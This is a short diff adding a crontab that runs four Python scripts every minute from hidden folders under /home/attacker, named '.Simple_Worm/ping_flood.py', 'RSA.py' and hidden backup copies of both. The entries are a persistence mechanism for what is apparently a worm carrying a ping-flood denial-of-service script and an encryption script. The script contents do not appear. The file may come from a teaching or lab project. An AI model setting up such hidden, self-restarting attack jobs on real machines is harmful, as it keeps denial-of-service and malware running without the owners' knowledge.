@@ -1,0 +1,5 @@
+*/1 * * * * python3 /home/attacker/Public/.Simple_Worm/ping_flood.py
+*/1 * * * * python3 /home/attacker/Public/.Simple_Worm/RSA.py
+*/1 * * * * python3 /home/attacker/Desktop/.Backup/ping_flood_backup.py
+*/1 * * * * python3 /home/attacker/Desktop/.Backup/RSA_backup.py
+
